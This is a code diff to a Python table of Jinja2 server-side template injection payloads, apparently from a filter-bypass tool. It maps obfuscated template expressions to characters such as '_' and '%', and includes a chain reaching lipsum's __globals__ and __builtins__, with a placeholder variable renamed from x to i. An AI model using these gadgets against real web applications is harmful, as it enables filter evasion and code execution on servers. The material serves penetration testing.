@@ -54,8 +54,8 @@ context_payloads_stmts: ContextPayloads = {
 context_payloads_stmts_py3 = {
     (
         "{%set ndr={}|select()|trim|list|batch(25)|first|last%}{%set sls=1|attr"
-        + "((ndr,ndr,dict(truediv=x)|join,ndr,ndr)|join)|attr"
-        + "((ndr,ndr,dict(doc=x)|join,ndr,ndr)|join)|batch(12)|first|last%}"
+        + "((ndr,ndr,dict(truediv=i)|join,ndr,ndr)|join)|attr"
+        + "((ndr,ndr,dict(doc=i)|join,ndr,ndr)|join)|batch(12)|first|last%}"
     ): {
         "ndr": "_",
         "sls": "/",
@@ -66,8 +66,8 @@ const_exprs = {
     "lipsum()|urlencode|first": "%",
     "{}|e|urlencode|first": "%",
     "lipsum|escape|batch(22)|first|last": "_",
-    "dict(x=x)|length": 1,
-    "dict(x=x)|count": 1,
+    "dict(x=i)|length": 1,
+    "dict(x=i)|count": 1,
     "()|int": 0,
     "{}|int": 0,
     "x|e|int": 0,
@@ -111,8 +111,8 @@ const_exprs = {
     "x|pprint|first|length": 1,
     "dict(a=x,b=x,c=x)|length": 3,
     "dict(a=x,b=x,c=x)|count": 3,
-    "dict(aaaaa=x)|first|length": 5,
-    "dict(aaaaa=x)|first|count": 5,
+    "dict(aaaaa=i)|first|length": 5,
+    "dict(aaaaa=i)|first|count": 5,
     "x|pprint|count": 9,
     "x|pprint|pprint|pprint|pprint|pprint|pprint|count": 41,
     "x|pprint|pprint|pprint|pprint|pprint|pprint|pprint|pprint|count": 137,
@@ -140,9 +140,9 @@ const_exprs_py3 = {
     ): "%",
     (
         "(lipsum[((({}|select()|trim|list)[24]))*2+"
-        + "dict(globals=x)|join+((({}|select()|trim|list)[24]))*2][((({}|select()"
-        + "|trim|list)[24]))*2+dict(builtins=x)|join+((({}|select()|trim|list"
-        + ")[24]))*2][dict(chr=x)|join](37))"
+        + "dict(globals=i)|join+((({}|select()|trim|list)[24]))*2][((({}|select()"
+        + "|trim|list)[24]))*2+dict(builtins=i)|join+((({}|select()|trim|list"
+        + ")[24]))*2][dict(chr=i)|join](37))"
     ): "%",
     "({}|select()|trim|list)[24]": "_",
     "{}|select()|trim|list|batch(25)|first|last": "_",
